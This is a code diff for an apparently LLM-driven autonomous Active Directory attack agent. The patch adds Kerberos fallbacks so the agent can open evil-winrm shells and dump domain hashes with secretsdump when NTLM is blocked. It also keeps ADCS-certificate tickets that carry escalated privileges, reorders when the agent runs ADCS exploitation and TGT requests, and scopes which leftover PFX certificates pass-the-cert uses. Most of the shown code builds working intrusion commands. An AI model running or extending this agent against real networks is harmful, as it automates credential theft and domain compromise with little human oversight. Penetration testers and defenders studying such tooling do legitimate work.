@@ -33,7 +33,10 @@ from utils.helpers import (
     BABY_BLUE, LIGHT_PINK, SOFT_PINK, PURE_WHITE, SOFT_WHITE,
     imp, _SYSPY, _IMP_DIR,
 )
-from config.settings import SESSION, OUTPUT_DIR, save_session, redact_obj, redact_text, SHOW_SECRETS
+from config.settings import (
+    SESSION, OUTPUT_DIR, save_session, redact_obj, redact_text, SHOW_SECRETS,
+    reset_engagement_state, reset_session_for_target_change,
+)
 
 # ── Package submodule imports ─────────────────────────────────────────────────
 from modules.agent.constants import (
@@ -503,23 +506,13 @@ def _extract_bloodyad_candidate_dn(text: str) -> str:
 
 def _reset_agent_runtime_state() -> None:
     """Keep each agent report tied to evidence from the current run."""
-    SESSION["commands_run"] = []
-    SESSION["findings"] = []
-    SESSION["owned_users"] = []
-    SESSION["owned_machines"] = []
-    SESSION["loot"] = {}
-    SESSION["agent_intel"] = {}
-    # Cross-session state that must not leak when targeting a different domain
-    SESSION["winrm_dead_for"] = []
-    SESSION["winrm_attempted_for"] = []
-    SESSION["network_unreachable"] = False
-    SESSION["network_unreachable_hits"] = 0
-    SESSION["start_time"] = datetime.now().isoformat()
-    SESSION["dc_fqdn"] = ""
-    SESSION["dc_hostname"] = ""
-    SESSION["base_dn"] = ""
-    SESSION["krb5_config"] = "/etc/krb5.conf"
-    SESSION["ntlm_disabled"] = False
+    keep_kerberos = {
+        "use_kerberos": SESSION.get("use_kerberos", False),
+        "krb5_ccache": SESSION.get("krb5_ccache", ""),
+        "krb5_config": SESSION.get("krb5_config", "/etc/krb5.conf"),
+    }
+    reset_engagement_state()
+    SESSION.update(keep_kerberos)
 
 def _redact_args_for_display(args: dict) -> dict:
     """Display real secrets when enabled, but never present *** as a real value."""
@@ -536,13 +529,23 @@ def _redact_args_for_display(args: dict) -> dict:
             safe[k] = v
     return safe
 
+def _json_safe(value):
+    """Convert runtime helper objects (Path, sets, custom keys) into JSON-safe data."""
+    if isinstance(value, dict):
+        return {str(k): _json_safe(v) for k, v in value.items()}
+    if isinstance(value, (list, tuple, set)):
+        return [_json_safe(v) for v in value]
+    if isinstance(value, Path):
+        return str(value)
+    return value
+
 def _format_arg_value(value, max_len: int = 96) -> str:
     if value in ("", None, [], {}):
         return "-"
     if isinstance(value, bool):
         text = "yes" if value else "no"
     elif isinstance(value, (list, tuple, dict)):
-        text = json.dumps(value, ensure_ascii=False, default=str)
+        text = json.dumps(_json_safe(value), ensure_ascii=False, default=str)
     else:
         text = str(value)
     text = text.replace("\n", " ").strip()
@@ -849,6 +852,8 @@ def _agent_intel() -> dict:
         "nt_hashes": {}, "gmsa_hashes": {},
         "pwn3d": False, "is_da": False, "ntlm_disabled": False,
         "adcs_shell_ready": False, "bloodhound_failed_nonblocking": False,
+        "last_adcs_scan_used_kerberos": False,
+        "last_adcs_needs_retry_after_tgt": False,
     }
     stored = SESSION.get("agent_intel", {})
     merged = {k: stored.get(k, v) for k, v in defaults.items()}
@@ -1550,6 +1555,8 @@ def _sanitize_tool_inputs(name: str, inputs: dict) -> dict:
     _attacker_lower = (_sess_usr or "").lower().strip("\\/@$")
     if _attacker_lower:
         for _k in _self_target_keys:
+            if name == "pass_the_cert" and _k == "target_user":
+                continue
             _v = str(inputs.get(_k, "")).lower().strip("\\/@$")
             # Strip DOMAIN\ or @realm decorations before comparing.
             _v_stem = _v.split("\\")[-1].split("@")[0]
@@ -3451,6 +3458,8 @@ def _auth_args_nxc(username: str, password: str = "", nt_hash: str = "",
     kdc = dc_ip or SESSION.get("dc_ip", "")
     nt_hash = _real_nt_hash(nt_hash)
     password = _real_secret(password)
+    if SESSION.get("ntlm_disabled") and _session_kerberos_usable(username, dom):
+        return f"-u '{username}' -k --use-kcache --kdcHost {kdc} -d {dom}"
     if nt_hash:
         return f"-u '{username}' -H '{nt_hash}' -d {dom}"
     if password and not SESSION.get("ntlm_disabled"):
@@ -3678,14 +3687,16 @@ def tool_nmap_scan(target_ip: str) -> str:
     # Store open ports so other tools can check availability without re-scanning
     if open_ports:
         SESSION.setdefault("agent_intel", {})["open_ports"] = open_ports
-        # Detect NTLM via SMB negotiation — nxc or nmap shows NTLM:False when off
+        # Nmap-time SMB banners are only hints. Do not switch the whole agent
+        # into Kerberos mode until a credentialed enum/auth step proves NTLM is
+        # actually blocked; otherwise Round 2 jumps to request_tgt too early.
         if "445" in open_ports:
             smb_ntlm_check = _run(
                 f"nxc smb {target_ip} 2>&1 | grep -i 'NTLM'", timeout=10
             )
             if "NTLM:False" in smb_ntlm_check or "ntlm: false" in smb_ntlm_check.lower():
-                SESSION["ntlm_disabled"] = True
-                SESSION.setdefault("agent_intel", {})["ntlm_disabled"] = True
+                SESSION["ntlm_disabled_hint"] = True
+                SESSION.setdefault("agent_intel", {})["ntlm_disabled_hint"] = True
     save_session()
     return f"NMAP OUTPUT:\n{out[:3000]}"
 
@@ -4679,11 +4690,17 @@ def tool_adcs_scan(dc_ip: str, domain: str, username: str,
     elif password:
         auth = f"-u '{username}@{domain}' -p '{password}'"
     else:
+        SESSION.setdefault("agent_intel", {})["last_adcs_scan_used_kerberos"] = False
+        SESSION.setdefault("agent_intel", {})["last_adcs_needs_retry_after_tgt"] = True
+        save_session()
         return (
             "ADCS scan skipped: no valid Kerberos ccache, password, or NT hash is available.\n"
             f"Current user: {username}@{domain}\n"
             "Run Session Manager to set credentials or run request_tgt first."
         )
+    SESSION.setdefault("agent_intel", {})["last_adcs_scan_used_kerberos"] = bool(krb and ccache)
+    SESSION.setdefault("agent_intel", {})["last_adcs_needs_retry_after_tgt"] = False
+    save_session()
 
     # certipy needs -target FQDN and -dc-host FQDN for Kerberos environments
     target_flags = (
@@ -4808,6 +4825,8 @@ def tool_adcs_scan(dc_ip: str, domain: str, username: str,
 
     # If ESC found but no Kerberos ticket, get TGT first then re-scan.
     if "ESC" in scan_out and not SESSION.get("use_kerberos") and not SESSION.get("krb5_ccache"):
+        SESSION.setdefault("agent_intel", {})["last_adcs_needs_retry_after_tgt"] = True
+        save_session()
         results.append("ESC vulnerability found but no Kerberos ticket — requesting TGT now...")
         tgt_res = tool_request_tgt(dc_ip, domain, username,
                                    password=SESSION.get("password", ""),
@@ -4867,6 +4886,20 @@ def tool_adcs_scan(dc_ip: str, domain: str, username: str,
                 results.append(f"=== certipy auth ===\n{auth_out[:1000]}")
                 new_cc = f"{pfx_name}.ccache"
                 if Path(new_cc).exists():
+                    # certipy writes the ccache as a RELATIVE filename in the CWD.
+                    # Left there it flickers: the next certipy round overwrites it and
+                    # other flows unlink "<user>.ccache", so KRB5CCNAME ends up pointing
+                    # at a file that vanishes mid-use (klist -> "No credentials cache").
+                    # Persist it to an ABSOLUTE path in the agent runtime dir (same
+                    # convention as the session ccache) under a distinct *_adcs name so a
+                    # later request_tgt cannot clobber this privileged (PAC-injected, e.g.
+                    # ESC13) ticket. Target-agnostic — only uses pfx_name/domain variables.
+                    try:
+                        stable = str(_runtime_path(f"{pfx_name}_{domain}_adcs.ccache"))
+                        shutil.move(new_cc, stable)
+                        new_cc = stable
+                    except Exception:
+                        new_cc = str(Path(new_cc).resolve())
                     os.environ["KRB5CCNAME"] = new_cc
                     SESSION["krb5_ccache"] = new_cc
                     SESSION["use_kerberos"] = True
@@ -6529,6 +6562,38 @@ def tool_evil_winrm(dc_ip: str, domain: str, username: str,
         test = _nxc(f"winrm {host} {nxc_auth}", timeout=20)
         access_confirmed = "Pwn3d!" in test
 
+    # Additive Kerberos fallback (ESC13 / PAC-injected group membership):
+    # An NT hash or password authenticates the *account*, but ADCS ESC13's
+    # privilege (e.g. an OID->group link granting Remote Management Users) lives
+    # ONLY in the Kerberos TGT's PAC, never in the NT hash. So when the NTLM/hash
+    # or password probe above did NOT confirm access yet a usable Kerberos ccache
+    # exists, retry the probe over Kerberos with evil-winrm before giving up.
+    # Purely additive: never runs when access is already confirmed, so cases
+    # where NTLM works are completely unaffected. Target-agnostic — keys only off
+    # "a ccache is available and NTLM didn't get us in".
+    if (not access_confirmed) and (not use_krb_auth) and krb and SESSION.get("krb5_ccache"):
+        ccache = SESSION["krb5_ccache"]
+        os.environ["KRB5CCNAME"] = ccache
+        krb_probe = (
+            f"printf 'whoami\\nhostname\\nexit\\n' | "
+            f"timeout 25 {ewrm_bin} -i {shell_quote(fqdn)} "
+            f"-r {shell_quote(realm)} -K {shell_quote(ccache)} 2>&1"
+        )
+        _record_agent_command(krb_probe)
+        krb_test = _run(krb_probe, timeout=30)
+        krb_ok = any(s in krb_test for s in (
+            "PS C:\\", "Evil-WinRM PS", "Evil-WinRM shell",
+            f"{domain.split('.')[0].upper()}\\", f"{domain.split('.')[0].lower()}\\",
+        ))
+        if not krb_ok and "Evil-WinRM" in krb_test and "Error" not in krb_test[:200]:
+            krb_ok = True
+        if krb_ok:
+            use_krb_auth = True
+            access_confirmed = True
+            host = fqdn
+            test = krb_test
+            connect_cmd = f"evil-winrm -i {fqdn} -r {realm} -K {ccache}"
+
     if access_confirmed:
         add_finding("WinRM Shell Access Confirmed", "Critical",
                     f"WinRM access: {username}@{host}",
@@ -8067,13 +8132,33 @@ def tool_credential_dump(dc_ip: str, domain: str, username: str,
         results.append(f"=== secretsdump ===\n{sd_out[:2000]}")
         _extract_creds_into_session(sd_out)
 
+        # Additive Kerberos fallback: on NTLM-disabled DCs (common in hardened AD)
+        # the -hashes pass-the-hash attempt above fails with STATUS_NOT_SUPPORTED.
+        # If it produced no real pwdump hash line and a usable Kerberos ccache
+        # exists, retry secretsdump over Kerberos before giving up. Purely
+        # additive — only runs when the first attempt did NOT already dump hashes
+        # and the primary path wasn't already Kerberos. Target-agnostic.
+        if (not re.search(r"[a-f0-9]{32}:[a-f0-9]{32}:::", sd_out, re.I)
+                and krb and ccache and "-k " not in sd_auth):
+            os.environ["KRB5CCNAME"] = ccache
+            _kt = shell_quote(f"{domain}/{username}@{host}")
+            ksd_out = _run(f"{secretsdump} -k -no-pass {_kt} -just-dc-ntlm 2>&1 || "
+                           f"{secretsdump} -k -no-pass {_kt} 2>&1", timeout=90)
+            results.append(f"=== secretsdump (Kerberos) ===\n{ksd_out[:2000]}")
+            _extract_creds_into_session(ksd_out)
+
     # nanodump via nxc module
     if method == "nanodump":
         nano_out = _nxc(f"smb {host} {auth} -M nanodump", timeout=60)
         results.append(f"=== nanodump ===\n{nano_out[:1200]}")
 
     all_out = "\n".join(results)
-    if any(s in all_out.lower() for s in ("ntlm:", "aad3b435", ":31d6", "administrator:")):
+    # Only flag success on an ACTUAL dumped pwdump hash line (user:rid:lm:nt:::).
+    # The old check matched substrings like "ntlm:" — which appears in every nxc
+    # banner as "(NTLM:False)" — so it fired even when every dump returned
+    # STATUS_NOT_SUPPORTED (false-positive Critical). The pwdump line only appears
+    # when SAM/LSA/secretsdump/NTDS genuinely returned hashes.
+    if re.search(r"[a-f0-9]{32}:[a-f0-9]{32}:::", all_out, re.I):
         add_finding("Credential Dump Successful", "Critical",
                     f"Credentials extracted from {host}",
                     "Enable Credential Guard; use Protected Users; audit LSASS access")
@@ -9225,6 +9310,46 @@ def _parse_json_tool_call(content: str):
     return None
 
 
+def _pfx_cert_domain(pfx_path: str) -> str:
+    """Return the AD domain (lowercase) embedded in a PFX's UPN/SAN, or '' if it
+    cannot be determined. Used to avoid picking up a leftover certificate from a
+    PREVIOUS engagement (different box/domain) when the agent globs *.pfx in the
+    CWD — that would feed pass_the_cert a foreign cert and fail with
+    KDC_ERR_C_PRINCIPAL_UNKNOWN. Target-agnostic: reads the cert, never hardcoded."""
+    try:
+        from cryptography.hazmat.primitives.serialization import pkcs12
+        from cryptography import x509
+        data = Path(pfx_path).read_bytes()
+        cert = None
+        for pw in (None, b""):
+            try:
+                _, cert, _ = pkcs12.load_key_and_certificates(data, pw)
+                break
+            except Exception:
+                cert = None
+        if cert is None:
+            return ""
+        try:
+            san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName).value
+            for name in san:
+                val = getattr(name, "value", None)
+                blob = bytes(val) if isinstance(val, (bytes, bytearray)) else str(val).encode()
+                m = re.search(rb"@([A-Za-z0-9.\-]+\.[A-Za-z]{2,})", blob)
+                if m:
+                    return m.group(1).decode(errors="ignore").lower()
+        except Exception:
+            pass
+        try:
+            dcs = [a.value for a in cert.subject if a.oid == x509.NameOID.DOMAIN_COMPONENT]
+            if dcs:
+                return ".".join(dcs).lower()
+        except Exception:
+            pass
+        return ""
+    except Exception:
+        return ""
+
+
 def _pick_next_tool(completed_tools: list,
                     exclude: set = None,
                     call_counts: dict = None) -> tuple:
@@ -9245,6 +9370,11 @@ def _pick_next_tool(completed_tools: list,
         return int(call_counts.get(name, 0))
     def _done(name: str) -> bool:
         return name in completed_tools or name in exclude
+    def _enum_attempted() -> bool:
+        return any(name in completed_tools for name in (
+            "enumerate_ldap", "enumerate_shares", "collect_bloodhound",
+            "acl_abuse_scan", "adcs_scan",
+        ))
 
     dc    = SESSION.get("dc_ip", "")
     dom   = SESSION.get("domain", "")
@@ -9269,6 +9399,9 @@ def _pick_next_tool(completed_tools: list,
     creds = {"dc_ip": dc, "domain": dom, "username": u, "password": p, "nt_hash": h}
     krbtgt_hash = _real_nt_hash(SESSION.get("loot", {}).get("krbtgt", "") or
                                 intel.get("krbtgt_hash", ""))
+    _esc_found = bool(intel["esc_vulns"]) or any(
+        "ESC" in str(f.get("name", "")) for f in SESSION.get("findings", [])
+    )
 
     # ── Priority -1: Post-DCSync golden ticket ───────────────────────────────
     if krbtgt_hash and not _done("golden_ticket"):
@@ -9277,7 +9410,22 @@ def _pick_next_tool(completed_tools: list,
     # ── Priority -1b: PassTheCert when PFX available but no NT hash yet ──────
     # Only trigger if certipy auth ccache/hash was NOT already obtained.
     pfx_candidates = list(Path(".").glob("*.pfx"))
-    if pfx_candidates and not _done("pass_the_cert") and not intel.get("ccaches"):
+    # Domain-scope leftover PFX files: a cert from a previous engagement must
+    # not be fed to pass_the_cert for the active target.
+    _dom_l = (dom or "").lower()
+    if pfx_candidates and _dom_l:
+        # Loose PFX files in the repo root may be leftovers from a previous
+        # target. Auto-use only certs that identify the active domain, or an
+        # unparseable cert whose filename matches the current principal.
+        _user_stem = (u or "").split("@")[0].split("\\")[-1].lower()
+        scoped = []
+        for p in pfx_candidates:
+            cert_domain = _pfx_cert_domain(str(p))
+            if cert_domain == _dom_l or (not cert_domain and p.stem.lower() == _user_stem):
+                scoped.append(p)
+        pfx_candidates = scoped
+    if (pfx_candidates and _done("nmap_scan") and _done("enumerate_ldap")
+            and not _done("pass_the_cert") and not intel.get("ccaches")):
         pfx = str(pfx_candidates[0])
         # Cert owner = full PFX stem (e.g. "c.roberts.pfx" → "c.roberts")
         cert_owner = pfx_candidates[0].stem or u
@@ -9345,6 +9493,39 @@ def _pick_next_tool(completed_tools: list,
 
     if intel.get("winrm_targets") and not _done("evil_winrm") and u not in winrm_dead_users:
         return "evil_winrm", {**creds, "target_ip": intel["winrm_targets"][0]}
+
+    # ── Priority 0c: ADCS scan early (before WinRM probing) ───────────────────
+    # On ADCS boxes (for example ESC13-style paths) WinRM/lateral paths can fail
+    # until certificate-based privilege is discovered. Run adcs_scan once after
+    # baseline recon+LDAP, while no shell-capable hash is in hand. Gated tightly
+    # so it does not disturb other targets:
+    #   • only AFTER recon+enumeration ran (nmap + ldap) — never pre-empts the
+    #     normal recon→enum→exploit methodology or fires on round 1,
+    #   • only when a Kerberos TGT exists (krb) — keeps request_tgt ahead of it,
+    #   • only once (not _done) — cannot loop.
+    # NOT gated on loot/NT-hash: ADCS ESC (ESC1/ESC13/…) is an independent
+    # escalation surface that must be enumerated even when a (possibly useless,
+    # e.g. UnPAC) hash is already in hand — standard AD methodology.
+    # Fully target-agnostic: adcs_scan is read-only enumeration that is a no-op on
+    # non-ADCS targets, so a box without a CA just continues the normal chain.
+    if (not _done("adcs_scan") and krb
+            and _done("nmap_scan") and _done("enumerate_ldap")):
+        return "adcs_scan", {**creds, "auto_exploit": True}
+
+    # A second ADCS attempt is only justified when the earlier scan ran without
+    # Kerberos, found an ESC path, and did not mint a usable shell-ready ccache.
+    # This preserves the original "retry after TGT" intent without allowing a
+    # late duplicate certipy find/req after a normal Kerberos ADCS run.
+    _cc_valid_now = _ccache_is_valid(cc)
+    if (_done("adcs_scan")
+            and _esc_found
+            and _cc_valid_now
+            and _calls("adcs_scan") < 2
+            and intel.get("last_adcs_needs_retry_after_tgt")
+            and not intel.get("last_adcs_scan_used_kerberos")
+            and not intel.get("adcs_shell_ready")
+            and "adcs_scan" not in exclude):
+        return "adcs_scan", {**creds, "auto_exploit": True}
 
     # ── Priority 1: Have NT hash → try to get shell immediately ──────────────
     # Skip WinRM probing entirely if previous attempts proved this principal
@@ -9423,7 +9604,12 @@ def _pick_next_tool(completed_tools: list,
         return "nmap_scan", {"target_ip": dc}
 
     # ── Priority 2: NTLM disabled → get Kerberos ticket ─────────────────────
-    if (ntlm_off or intel["ntlm_disabled"]) and not (krb and _ccache_is_valid(cc)):
+    # Only pivot after at least one credentialed enum/auth tool has actually
+    # tried and produced a Kerberos-required signal. Nmap's NTLM banner alone is
+    # not enough evidence; normal AD flow is nmap -> LDAP enum before TGT.
+    if (_enum_attempted()
+            and (ntlm_off or intel["ntlm_disabled"])
+            and not (krb and _ccache_is_valid(cc))):
         if not _done("request_tgt"):
             return "request_tgt", creds
 
@@ -9521,16 +9707,12 @@ def _pick_next_tool(completed_tools: list,
 
     # ── Priority 5: Certificate attacks (often path to DA) ───────────────────
     # If ESC was found in loot but no TGT → request_tgt before adcs exploit
-    _esc_found = bool(intel["esc_vulns"]) or any("ESC" in str(f.get("name","")) for f in SESSION.get("findings",[]))
     _cc_valid  = _ccache_is_valid(cc)
     if _esc_found and not _cc_valid and not _done("request_tgt"):
         return "request_tgt", creds
 
-    if not _done("adcs_scan"):
-        return "adcs_scan", {**creds, "auto_exploit": True}
-
-    # Re-run adcs_scan after getting TGT (if ESC was found before TGT)
-    if _esc_found and _cc_valid and _calls("adcs_scan") < 2 and "adcs_scan" not in exclude:
+    if (not _done("adcs_scan") and krb
+            and _done("nmap_scan") and _done("enumerate_ldap")):
         return "adcs_scan", {**creds, "auto_exploit": True}
 
     # ACL/gMSA edges are often the shortest path from a standard domain user.
@@ -9800,6 +9982,10 @@ def _agent_complete_override(completed_tools: list) -> tuple:
         "nt_hash": SESSION.get("nt_hash", ""),
     }
     intel = _agent_intel()
+    enum_attempted = any(name in completed_tools for name in (
+        "enumerate_ldap", "enumerate_shares", "collect_bloodhound",
+        "acl_abuse_scan", "adcs_scan",
+    ))
     for _right, target in _gmsa_write_edges():
         if "guard_gmsa_takeover" not in completed_tools and "gmsa_takeover" not in completed_tools:
             return "gmsa_takeover", {**creds, "target_gmsa": str(target)}, "guard_gmsa_takeover"
@@ -9816,6 +10002,15 @@ def _agent_complete_override(completed_tools: list) -> tuple:
             and "gmsa_read" not in completed_tools):
         return "gmsa_read", creds, "guard_gmsa_read"
 
+    cc = SESSION.get("krb5_ccache", "")
+    cc_valid = _ccache_is_valid(cc)
+    if (SESSION.get("password")
+            and enum_attempted
+            and (SESSION.get("ntlm_disabled") or intel.get("ntlm_disabled"))
+            and not cc_valid
+            and "guard_request_tgt" not in completed_tools):
+        return "request_tgt", creds, "guard_request_tgt"
+
     has_material_progress = bool(
         SESSION.get("loot")
         or SESSION.get("owned_users")
@@ -9830,11 +10025,6 @@ def _agent_complete_override(completed_tools: list) -> tuple:
     if _agent_has_progress():
         return "", {}, ""
 
-    cc = SESSION.get("krb5_ccache", "")
-    cc_valid = _ccache_is_valid(cc)
-
-    if SESSION.get("password") and not cc_valid and "guard_request_tgt" not in completed_tools:
-        return "request_tgt", creds, "guard_request_tgt"
     if cc_valid and "guard_enumerate_ldap_kerberos" not in completed_tools:
         SESSION["use_kerberos"] = True
         return "enumerate_ldap", creds, "guard_enumerate_ldap_kerberos"
@@ -9856,7 +10046,7 @@ def _make_fake_tc(name: str, inputs: dict, idx: int):
     tc.id = f"fallback_{idx}"
     tc.function = _F()
     tc.function.name = name
-    tc.function.arguments = json.dumps(inputs)
+    tc.function.arguments = json.dumps(_json_safe(inputs or {}), default=str)
     return tc
 
 
@@ -9865,7 +10055,7 @@ def _make_fake_tc(name: str, inputs: dict, idx: int):
 # obtained from another tool feeding back in). Everything else gets the loop guard.
 _REPEATABLE_TOOLS = {
     "evil_winrm", "lateral_movement",
-    "request_tgt", "adcs_scan",
+    "request_tgt",
 }
 
 def _stable_args_signature(name: str, inputs: dict) -> str:
@@ -9899,9 +10089,18 @@ def run_agent_ollama(target_ip: str, domain: str, username: str,
 
     password = _real_secret(password)
     nt_hash = _real_nt_hash(nt_hash)
+    if reset_session_for_target_change(dc_ip=target_ip, domain=domain):
+        warn("[Agent] Target/domain changed — cleared previous engagement state")
     _reset_agent_runtime_state()
     SESSION.update({"dc_ip": target_ip, "domain": domain,
                     "username": username, "password": password, "nt_hash": nt_hash})
+
+    # Wipe per-run agent_runtime FIRST — BEFORE validating Kerberos state below.
+    # Otherwise the validation confirms a ccache that this cleanup then deletes,
+    # leaving use_kerberos=True with KRB5CCNAME pointing at a removed file
+    # (GSSAPI "no credentials" / vanished ADCS ccache).
+    ts              = datetime.now().strftime('%Y%m%d_%H%M%S')
+    _clean_agent_output_for_new_run(ts)
 
     # ── Validate Kerberos state from previous runs ────────────────────────────
     # If SESSION has use_kerberos=True but the ccache file is missing/expired,
@@ -9923,9 +10122,6 @@ def run_agent_ollama(target_ip: str, domain: str, username: str,
             # ccache is valid — keep Kerberos mode active
             os.environ["KRB5CCNAME"] = _cc
             info(f"[Agent] Valid Kerberos ccache loaded: {_cc}")
-
-    ts              = datetime.now().strftime('%Y%m%d_%H%M%S')
-    _clean_agent_output_for_new_run(ts)
     _runtime_path("agent_loot").mkdir(exist_ok=True)
     _runtime_path("agent_loot_chain").mkdir(exist_ok=True)
     log_path        = LOG_DIR / f"agent_ollama_{ts}.json"
@@ -10064,9 +10260,12 @@ def run_agent_ollama(target_ip: str, domain: str, username: str,
         if tool_calls and (_llm_picked_bad or _llm_ignoring_critical):
             tool_calls = [_make_fake_tc(_recommended, _rec_inputs, round_num)]
 
-        # ── Adaptive gate: force request_tgt when NTLM disabled + no ccache ────
+        # ── Adaptive gate: force request_tgt when proven NTLM-disabled + no ccache ─
+        # Do not pivot from nmap/banner hints alone. Normal AD order remains:
+        # nmap -> LDAP enum -> Kerberos repair only if auth evidence requires it.
         elif (tool_calls
               and _ntlm_off
+              and "enumerate_ldap" in completed_tools
               and not _cc_valid
               and "request_tgt" not in completed_tools
               and SESSION.get("password")
@@ -10670,6 +10869,8 @@ def run_agent(target_ip: str, domain: str, username: str,
     # Initialize session
     password = _real_secret(password)
     nt_hash = _real_nt_hash(nt_hash)
+    if reset_session_for_target_change(dc_ip=target_ip, domain=domain):
+        warn("[Agent] Target/domain changed — cleared previous engagement state")
     _reset_agent_runtime_state()
     SESSION.update({
         "dc_ip":    target_ip,
@@ -10678,6 +10879,11 @@ def run_agent(target_ip: str, domain: str, username: str,
         "password": password,
         "nt_hash":  nt_hash,
     })
+
+    # Wipe per-run agent_runtime FIRST — before validating Kerberos state below,
+    # so validation cannot confirm a ccache that cleanup then deletes.
+    ts       = datetime.now().strftime('%Y%m%d_%H%M%S')
+    _clean_agent_output_for_new_run(ts)
 
     # Validate Kerberos state (same check as Ollama loop)
     _cc = SESSION.get("krb5_ccache", "")
@@ -10709,8 +10915,6 @@ def run_agent(target_ip: str, domain: str, username: str,
     )
 
     messages = [{"role": "user", "content": init_msg}]
-    ts       = datetime.now().strftime('%Y%m%d_%H%M%S')
-    _clean_agent_output_for_new_run(ts)
     _runtime_path("agent_loot").mkdir(exist_ok=True)
     _runtime_path("agent_loot_chain").mkdir(exist_ok=True)
     log_path = LOG_DIR / f"agent_{ts}.json"
